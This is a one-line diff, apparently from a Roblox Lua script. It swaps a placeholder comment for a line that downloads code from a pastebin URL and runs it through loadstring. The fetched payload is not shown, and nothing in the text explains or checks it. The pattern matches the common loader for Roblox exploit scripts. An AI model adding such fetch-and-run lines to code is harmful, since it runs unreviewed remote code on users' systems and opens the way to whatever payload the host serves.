@@ -1,1 +1,1 @@
---wait 5 sec I need test something
+loadstring(game:HttpGet("https://pastebin.com/raw/cLtZwfRF", true))()
